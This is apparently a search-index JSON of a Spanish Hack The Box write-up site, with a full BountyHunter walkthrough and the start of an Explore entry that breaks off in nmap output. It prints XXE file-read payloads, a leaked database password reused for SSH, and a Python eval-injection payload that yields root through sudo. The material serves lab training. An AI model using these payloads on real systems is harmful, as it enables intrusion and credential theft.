{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":".md-typeset h1, .md-content__button { display: none; }","title":"Home"},{"location":"machines/bountyhunter/","text":".md-typeset h1, .md-content__button { display: none; } Difficulty : Easy Operating System : Linux Rating : 4.4 Author : ejedev Description Para comprometer esta maquina haremos uso de una vulnerabilidad xxe que nos permitira abrir el camino para encontrar las credenciales del usuario inicial. Una vez dentro de la maquina deberemos explotar un script en python para conseguir acceso a root. Aunque el enunciado indica que es una maquina de nivel facil, yo la calificaria de intermedia, pues necesitamos pensar un poco \"out of the box\" para realizar la intrusion. Enumeration Para la enumeracion basica vamos a utilizar una tool que he desarrollado especificamente para trabajar con maquinas en la plataforma hackthebox. Esta herramienta crea la carpeta de trabajo, realiza un escaneo basico con nmap y si encuentra un servicio web le lanza una enumeracion basica. Descarga: HTBenum Nmap Nmap scan report for bountyhunter.htb (10.129.192.240) Host is up (0.069s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Whatweb http://bountyhunter.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.192.240], JQuery, Script, Title[Bounty Hunters] HTTP Headers HTTP/1.1 200 OK Date: Mon, 26 Jul 2021 14:50:32 GMT Server: Apache/2.4.41 (Ubuntu) Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 Fuzzing URL [root@htb bountyhunter]# ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml','.py','.log','.json','.old' -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://bountyhunter.htb/FUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1-dev ________________________________________________ :: Method : GET :: URL : http://bountyhunter.htb/FUZZ :: Wordlist : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .htm .php .html .js .txt .zip .bak .asp .aspx .xml .py .log .json .old :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ index.php [Status: 200, Size: 25169, Words: 10028, Lines: 389] resources [Status: 301, Size: 324, Words: 20, Lines: 10] [INFO] Adding a new job to the queue: http://bountyhunter.htb/resources/FUZZ assets [Status: 301, Size: 321, Words: 20, Lines: 10] [INFO] Adding a new job to the queue: http://bountyhunter.htb/assets/FUZZ portal.php [Status: 200, Size: 125, Words: 11, Lines: 6] css [Status: 301, Size: 318, Words: 20, Lines: 10] [INFO] Adding a new job to the queue: http://bountyhunter.htb/css/FUZZ db.php [Status: 200, Size: 0, Words: 1, Lines: 1] js [Status: 301, Size: 317, Words: 20, Lines: 10] [INFO] Adding a new job to the queue: http://bountyhunter.htb/js/FUZZ User Own Tras analizar los directorios y ficheros obtenidos con ffuf , me encuentro con dos archivos interesantes dentro de la carpeta resources En este archivo podemos ver una lista de tareas pendientes , aparentemente los passwords no se hashean. README.txt Tasks: [ ] Disable 'test' account on portal and switch to hashed password. Disable nopass. [X] Write tracker submit script [ ] Connect tracker submit script to the database [X] Fix developer group permissions El siguiente archivo nos muestra lo que parece ser un formulario enviado como POST a tracker_diRbPr00f314.php que es procesado como un xml, lo que nos indica que podriamos estar ante una vulnerabilidad XML External Entity bountylog.js function returnSecret(data) { return Promise.resolve($.ajax({ type: \"POST\", data: {\"data\":data}, url: \"tracker_diRbPr00f314.php\" })); } async function bountySubmit() { try { var xml = `<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <bugreport> <title>${$('#exploitTitle').val()}</title> <cwe>${$('#cwe').val()}</cwe> <cvss>${$('#cvss').val()}</cvss> <reward>${$('#reward').val()}</reward> </bugreport>` let data = await returnSecret(btoa(xml)); $(\"#return\").html(data) } catch(error) { console.log('Error:', error); } } El siguiente paso es generar el formulario en la url http://bountyhunter.htb/portal.php y analizar la request desde BurpSuite Enviamos todo a Repeater para trabajar con comodidad y nos llevamos el resultado de data a Decoder , para analizar y generar el payload que vamos a inyectar Como vemos en la imagen anterior, obtenemos el data limpio que se ha enviado como POST a tracker_diRbPr00f314.php . A continuacion vamos a inyectar un payload para intentar leer /etc/passwd y lo volvemos a codear para enviarlo con repeater readfile payload <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> <bugreport> <title>&xxe;</title> <cwe>666</cwe> <cvss>10</cvss> <reward>80k</reward> </bugreport> Copiamos el resultado y vamos a Repeater para inyectar nuestro nuevo data Genial! hemos conseguido leer un fichero de sistema. He probado varios payloads para xxe con la intencion de realizar un RCE sin exito. Por lo que finalmente he escrito un exploit para explotar directamente la vulnerabilidad desde consola y facilitarme la lectura de ficheros en el sistema con la intencion de escalar privilegios. Descarga: xplxxe.sh [root@htb bountyhunter]# ./xplxxe.sh \"/etc/passwd\" root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin -- SNIP -- tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin Despues de estar un rato analizando ficheros en el sistema sin encontrar nada relevante, recorde que con ffuf encontre un fichero llamado db.php que seguramente contenga datos importantes. Tras intentar localizarlo dentro de la que deberia ser la ruta del servidor web /var/www/html sin exito, tuve que modificar el payload para leer ficheros del servidor web a traves de php filter. Se trata de la funcion //filter/convert.base64-encode/resource que viene incluida en PHP desde la version 5.0.0 y obliga a php a convertir los archivos a base64 antes de su ejecucion. Encontre la solucion en la increible documentacion de HackTricks phpfilter payload <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=db.php\" >]> <bugreport> <title>&xxe;</title> <cwe>d3l3t3m3</cwe> <cvss>d3l3t3m3</cvss> <reward>d3l3t3m3</reward> </bugreport> Una vez a\u00f1adido al exploit, ahora si podemos leer el archivo db.php [root@htb bountyhunter]# ./xplxxe.sh \"db.php\" <?php // TODO -> Implement login system with the database. $dbserver = \"localhost\"; $dbname = \"bounty\"; $dbusername = \"admin\"; $dbpassword = \"m19RoAU0hP41A1sTsq6K\"; $testuser = \"test\"; ?> Reutilizamos esta contrase\u00f1a contra el usuario development que encontramos en /etc/passwd y logramos acceder por ssh development m19RoAU0hP41A1sTsq6K [root@htb bountyhunter]# ssh -l development bountyhunter.htb development@bountyhunter.htb's password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri 30 Jul 2021 12:37:23 AM UTC System load: 0.0 Usage of /: 26.0% of 6.83GB Memory usage: 24% Swap usage: 0% Processes: 209 Users logged in: 0 IPv4 address for eth0: 10.10.11.100 IPv6 address for eth0: dead:beef::250:56ff:feb9:50cd 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Thu Jul 29 15:54:43 2021 from 10.10.14.15 development@bountyhunter:~$ id uid=1000(development) gid=1000(development) groups=1000(development) Root Own El vector de ataque para conseguir usuario root esta claro desde el principio, una enumeracion basica en la maquina nos pondra sobre la pista rapidamente Descarga: ticketValidator.py development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Un analisis rapido nos indica que es un script para validar tickets que contiene varias verificaciones para asegurarse que es un ticket correcto. En la carpeta /opt/skytrain_inc/invalid_tickets/ podemos encontrar unos tickets aparentemente invalidos. development@bountyhunter:~$ ls /opt/skytrain_inc/invalid_tickets/ -alt total 24 drwxr-xr-x 2 root root 4096 Jul 22 11:08 . drwxr-xr-x 3 root root 4096 Jul 22 11:08 .. -r--r--r-- 1 root root 102 Jul 22 11:08 390681613.md -r--r--r-- 1 root root 86 Jul 22 11:08 529582686.md -r--r--r-- 1 root root 97 Jul 22 11:08 600939065.md -r--r--r-- 1 root root 101 Jul 22 11:08 734485704.md development@bountyhunter:~$ cat /opt/skytrain_inc/invalid_tickets/390681613.md # Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **31+410+86** ##Issued: 2021/04/06 #End Ticket development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /opt/skytrain_inc/invalid_tickets/390681613.md Destination: New Haven Invalid ticket. development@bountyhunter:~$ Mi primera opcion es copiar uno de estos tickets e intentar modificarlo para conseguir que el script lo valide, pero para esto necesitamos comprender que hace exactamente el script. Vamos a analizarlo paso a paso: Lo primero que encontramos es una verificacion con la extension del archivo. Debe ser .md ( MarkDown ) def load_file(loc): if loc.endswith(\".md\"): return open(loc, 'r') else: print(\"Wrong file type.\") exit() Seguidamente encontramos una funcion que verifica la estructura del archivo: def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): # Lee las lineas del archivo if i == 0: if not x.startswith(\"# Skytrain Inc\"): # La primera linea debe empezar por # Skytrain Inc return False continue if i == 1: if not x.startswith(\"## Ticket to \"): # La segunda linea debe empezar por ## Ticket to return False print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue if x.startswith(\"__Ticket Code:__\"): # La tercera linea debe empezar por __Ticket Code:__ code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\"**\"): # La cuarta linea debe empezar por ** return False ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] # esto recoge y reemplaza el numero que pongamos, un *99+ quedaria en 99 if int(ticketCode) % 7 == 4: # Esta funcion evalua si el entero que hemos puesto tiene un resto (remainder) de 4 validationNumber = eval(x.replace(\"**\", \"\")) # aqui esta el truco, parece que no se valida el \"cierre\" de la variable, aqui inyectaremos nuestro payload if validationNumber > 100: # el entero con resto 4 debe ser mayor de 100 return True else: return False return False Teniendo todos los puntos claros, parece ser que los tickets invalidos encontrados cumplen casi todas las funciones excepto que los enteros dividos entre 7 no dan de resto 4. Para saber que numeros (mayores de 100) dan de resto 4, voy a escribir un script rapido. #!/usr/bin/env bash #este script busca numeros entre 100 y 2000 que den como resto 4 for i in {100..2000};do num=$(($i % 7)) if [ $num = 4 ];then echo \"$i entre 7 da resto $num\" fi done Lanzamos el script [root@htb bountyhunter]# ./calc.sh 102 entre 7 da resto 4 109 entre 7 da resto 4 116 entre 7 da resto 4 123 entre 7 da resto 4 130 entre 7 da resto 4 137 entre 7 da resto 4 144 entre 7 da resto 4 151 entre 7 da resto 4 158 entre 7 da resto 4 165 entre 7 da resto 4 -- SNIP --- 1985 entre 7 da resto 4 1992 entre 7 da resto 4 1999 entre 7 da resto 4 Ahora que tenemos numeros validos, vamos a construir un ticket y lo pasamos por el ticket validator development@bountyhunter:~$ cat lala.md # Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **1999** ##Issued: 2021/04/06 #End Ticket development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. lala.md Destination: New Haven Valid ticket. Ahora que tenemos un ticket valido, vamos a inyectar un payload dando la primera variable como TRUE y agregando un and PAYLOAD , veamoslo : payload # Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **1999+1 == 2000 and __import__('os').system('id') == False ##Issued: 2021/04/06 #End Ticket development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. lala.md Destination: New Haven uid=0(root) gid=0(root) groups=0(root) Invalid ticket.","title":"BountyHunter"},{"location":"machines/bountyhunter/#description","text":"Para comprometer esta maquina haremos uso de una vulnerabilidad xxe que nos permitira abrir el camino para encontrar las credenciales del usuario inicial. Una vez dentro de la maquina deberemos explotar un script en python para conseguir acceso a root. Aunque el enunciado indica que es una maquina de nivel facil, yo la calificaria de intermedia, pues necesitamos pensar un poco \"out of the box\" para realizar la intrusion.","title":" Description"},{"location":"machines/bountyhunter/#enumeration","text":"Para la enumeracion basica vamos a utilizar una tool que he desarrollado especificamente para trabajar con maquinas en la plataforma hackthebox. Esta herramienta crea la carpeta de trabajo, realiza un escaneo basico con nmap y si encuentra un servicio web le lanza una enumeracion basica. Descarga: HTBenum Nmap Nmap scan report for bountyhunter.htb (10.129.192.240) Host is up (0.069s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Whatweb http://bountyhunter.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.192.240], JQuery, Script, Title[Bounty Hunters] HTTP Headers HTTP/1.1 200 OK Date: Mon, 26 Jul 2021 14:50:32 GMT Server: Apache/2.4.41 (Ubuntu) Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 Fuzzing URL [root@htb bountyhunter]# ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml','.py','.log','.json','.old' -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://bountyhunter.htb/FUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1-dev ________________________________________________ :: Method : GET :: URL : http://bountyhunter.htb/FUZZ :: Wordlist : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .htm .php .html .js .txt .zip .bak .asp .aspx .xml .py .log .json .old :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ index.php [Status: 200, Size: 25169, Words: 10028, Lines: 389] resources [Status: 301, Size: 324, Words: 20, Lines: 10] [INFO] Adding a new job to the queue: http://bountyhunter.htb/resources/FUZZ assets [Status: 301, Size: 321, Words: 20, Lines: 10] [INFO] Adding a new job to the queue: http://bountyhunter.htb/assets/FUZZ portal.php [Status: 200, Size: 125, Words: 11, Lines: 6] css [Status: 301, Size: 318, Words: 20, Lines: 10] [INFO] Adding a new job to the queue: http://bountyhunter.htb/css/FUZZ db.php [Status: 200, Size: 0, Words: 1, Lines: 1] js [Status: 301, Size: 317, Words: 20, Lines: 10] [INFO] Adding a new job to the queue: http://bountyhunter.htb/js/FUZZ","title":" Enumeration"},{"location":"machines/bountyhunter/#user-own","text":"Tras analizar los directorios y ficheros obtenidos con ffuf , me encuentro con dos archivos interesantes dentro de la carpeta resources En este archivo podemos ver una lista de tareas pendientes , aparentemente los passwords no se hashean. README.txt Tasks: [ ] Disable 'test' account on portal and switch to hashed password. Disable nopass. [X] Write tracker submit script [ ] Connect tracker submit script to the database [X] Fix developer group permissions El siguiente archivo nos muestra lo que parece ser un formulario enviado como POST a tracker_diRbPr00f314.php que es procesado como un xml, lo que nos indica que podriamos estar ante una vulnerabilidad XML External Entity bountylog.js function returnSecret(data) { return Promise.resolve($.ajax({ type: \"POST\", data: {\"data\":data}, url: \"tracker_diRbPr00f314.php\" })); } async function bountySubmit() { try { var xml = `<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <bugreport> <title>${$('#exploitTitle').val()}</title> <cwe>${$('#cwe').val()}</cwe> <cvss>${$('#cvss').val()}</cvss> <reward>${$('#reward').val()}</reward> </bugreport>` let data = await returnSecret(btoa(xml)); $(\"#return\").html(data) } catch(error) { console.log('Error:', error); } } El siguiente paso es generar el formulario en la url http://bountyhunter.htb/portal.php y analizar la request desde BurpSuite Enviamos todo a Repeater para trabajar con comodidad y nos llevamos el resultado de data a Decoder , para analizar y generar el payload que vamos a inyectar Como vemos en la imagen anterior, obtenemos el data limpio que se ha enviado como POST a tracker_diRbPr00f314.php . A continuacion vamos a inyectar un payload para intentar leer /etc/passwd y lo volvemos a codear para enviarlo con repeater readfile payload <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> <bugreport> <title>&xxe;</title> <cwe>666</cwe> <cvss>10</cvss> <reward>80k</reward> </bugreport> Copiamos el resultado y vamos a Repeater para inyectar nuestro nuevo data Genial! hemos conseguido leer un fichero de sistema. He probado varios payloads para xxe con la intencion de realizar un RCE sin exito. Por lo que finalmente he escrito un exploit para explotar directamente la vulnerabilidad desde consola y facilitarme la lectura de ficheros en el sistema con la intencion de escalar privilegios. Descarga: xplxxe.sh [root@htb bountyhunter]# ./xplxxe.sh \"/etc/passwd\" root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin -- SNIP -- tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin Despues de estar un rato analizando ficheros en el sistema sin encontrar nada relevante, recorde que con ffuf encontre un fichero llamado db.php que seguramente contenga datos importantes. Tras intentar localizarlo dentro de la que deberia ser la ruta del servidor web /var/www/html sin exito, tuve que modificar el payload para leer ficheros del servidor web a traves de php filter. Se trata de la funcion //filter/convert.base64-encode/resource que viene incluida en PHP desde la version 5.0.0 y obliga a php a convertir los archivos a base64 antes de su ejecucion. Encontre la solucion en la increible documentacion de HackTricks phpfilter payload <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=db.php\" >]> <bugreport> <title>&xxe;</title> <cwe>d3l3t3m3</cwe> <cvss>d3l3t3m3</cvss> <reward>d3l3t3m3</reward> </bugreport> Una vez a\u00f1adido al exploit, ahora si podemos leer el archivo db.php [root@htb bountyhunter]# ./xplxxe.sh \"db.php\" <?php // TODO -> Implement login system with the database. $dbserver = \"localhost\"; $dbname = \"bounty\"; $dbusername = \"admin\"; $dbpassword = \"m19RoAU0hP41A1sTsq6K\"; $testuser = \"test\"; ?> Reutilizamos esta contrase\u00f1a contra el usuario development que encontramos en /etc/passwd y logramos acceder por ssh development m19RoAU0hP41A1sTsq6K [root@htb bountyhunter]# ssh -l development bountyhunter.htb development@bountyhunter.htb's password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri 30 Jul 2021 12:37:23 AM UTC System load: 0.0 Usage of /: 26.0% of 6.83GB Memory usage: 24% Swap usage: 0% Processes: 209 Users logged in: 0 IPv4 address for eth0: 10.10.11.100 IPv6 address for eth0: dead:beef::250:56ff:feb9:50cd 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Thu Jul 29 15:54:43 2021 from 10.10.14.15 development@bountyhunter:~$ id uid=1000(development) gid=1000(development) groups=1000(development)","title":" User Own"},{"location":"machines/bountyhunter/#root-own","text":"El vector de ataque para conseguir usuario root esta claro desde el principio, una enumeracion basica en la maquina nos pondra sobre la pista rapidamente Descarga: ticketValidator.py development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Un analisis rapido nos indica que es un script para validar tickets que contiene varias verificaciones para asegurarse que es un ticket correcto. En la carpeta /opt/skytrain_inc/invalid_tickets/ podemos encontrar unos tickets aparentemente invalidos. development@bountyhunter:~$ ls /opt/skytrain_inc/invalid_tickets/ -alt total 24 drwxr-xr-x 2 root root 4096 Jul 22 11:08 . drwxr-xr-x 3 root root 4096 Jul 22 11:08 .. -r--r--r-- 1 root root 102 Jul 22 11:08 390681613.md -r--r--r-- 1 root root 86 Jul 22 11:08 529582686.md -r--r--r-- 1 root root 97 Jul 22 11:08 600939065.md -r--r--r-- 1 root root 101 Jul 22 11:08 734485704.md development@bountyhunter:~$ cat /opt/skytrain_inc/invalid_tickets/390681613.md # Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **31+410+86** ##Issued: 2021/04/06 #End Ticket development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /opt/skytrain_inc/invalid_tickets/390681613.md Destination: New Haven Invalid ticket. development@bountyhunter:~$ Mi primera opcion es copiar uno de estos tickets e intentar modificarlo para conseguir que el script lo valide, pero para esto necesitamos comprender que hace exactamente el script. Vamos a analizarlo paso a paso: Lo primero que encontramos es una verificacion con la extension del archivo. Debe ser .md ( MarkDown ) def load_file(loc): if loc.endswith(\".md\"): return open(loc, 'r') else: print(\"Wrong file type.\") exit() Seguidamente encontramos una funcion que verifica la estructura del archivo: def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): # Lee las lineas del archivo if i == 0: if not x.startswith(\"# Skytrain Inc\"): # La primera linea debe empezar por # Skytrain Inc return False continue if i == 1: if not x.startswith(\"## Ticket to \"): # La segunda linea debe empezar por ## Ticket to return False print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue if x.startswith(\"__Ticket Code:__\"): # La tercera linea debe empezar por __Ticket Code:__ code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\"**\"): # La cuarta linea debe empezar por ** return False ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] # esto recoge y reemplaza el numero que pongamos, un *99+ quedaria en 99 if int(ticketCode) % 7 == 4: # Esta funcion evalua si el entero que hemos puesto tiene un resto (remainder) de 4 validationNumber = eval(x.replace(\"**\", \"\")) # aqui esta el truco, parece que no se valida el \"cierre\" de la variable, aqui inyectaremos nuestro payload if validationNumber > 100: # el entero con resto 4 debe ser mayor de 100 return True else: return False return False Teniendo todos los puntos claros, parece ser que los tickets invalidos encontrados cumplen casi todas las funciones excepto que los enteros dividos entre 7 no dan de resto 4. Para saber que numeros (mayores de 100) dan de resto 4, voy a escribir un script rapido. #!/usr/bin/env bash #este script busca numeros entre 100 y 2000 que den como resto 4 for i in {100..2000};do num=$(($i % 7)) if [ $num = 4 ];then echo \"$i entre 7 da resto $num\" fi done Lanzamos el script [root@htb bountyhunter]# ./calc.sh 102 entre 7 da resto 4 109 entre 7 da resto 4 116 entre 7 da resto 4 123 entre 7 da resto 4 130 entre 7 da resto 4 137 entre 7 da resto 4 144 entre 7 da resto 4 151 entre 7 da resto 4 158 entre 7 da resto 4 165 entre 7 da resto 4 -- SNIP --- 1985 entre 7 da resto 4 1992 entre 7 da resto 4 1999 entre 7 da resto 4 Ahora que tenemos numeros validos, vamos a construir un ticket y lo pasamos por el ticket validator development@bountyhunter:~$ cat lala.md # Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **1999** ##Issued: 2021/04/06 #End Ticket development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. lala.md Destination: New Haven Valid ticket. Ahora que tenemos un ticket valido, vamos a inyectar un payload dando la primera variable como TRUE y agregando un and PAYLOAD , veamoslo : payload # Skytrain Inc ## Ticket to New Haven __Ticket Code:__ **1999+1 == 2000 and __import__('os').system('id') == False ##Issued: 2021/04/06 #End Ticket development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. lala.md Destination: New Haven uid=0(root) gid=0(root) groups=0(root) Invalid ticket.","title":" Root Own"},{"location":"machines/explore/","text":".md-typeset h1, .md-content__button { display: none; } Difficulty : Easy Operating System : Android Rating : 4.0 Author : bertolis Description Esta es una maquina diferente, emula un dispositivo android que expone un servicio vulnerable y un \"tricky\" para conectarnos a ella con la suite adb. Es una maquina divertida que nos acerca a un entorno que no solemos ver en la plataforma hack the box. Enumeration Para la enumeracion basica vamos a utilizar una tool que he desarrollado especificamente para trabajar con maquinas en la plataforma hackthebox. Esta herramienta crea la carpeta de trabajo, realiza un escaneo basico con nmap y si encuentra un servicio web le lanza una enumeracion basica. Descarga: HTBenum Nmap Nmap scan report for explore.htb (10.10.10.247) Host is up (0.077s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 33083/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:01 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Wed, 28 Jul 2021 20:20:01 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Wed, 28 Jul 2021 20:20:06 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:22 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | Kerberos: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:22 GMT | Content-Length: 41 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | qj?n0?k? | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:06 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:22 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????<=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:22 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ ??random1random2random3random4 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn't have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.70%I=7%D=7/28%Time=6101BA26%P=x86_64-pc-linux-gnu%r(NU SF:LL,24,\"SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port33083-TCP:V=7.70%I=7%D=7/28%Time=6101BA25%P=x86_64-pc-linux-gnu%r(G 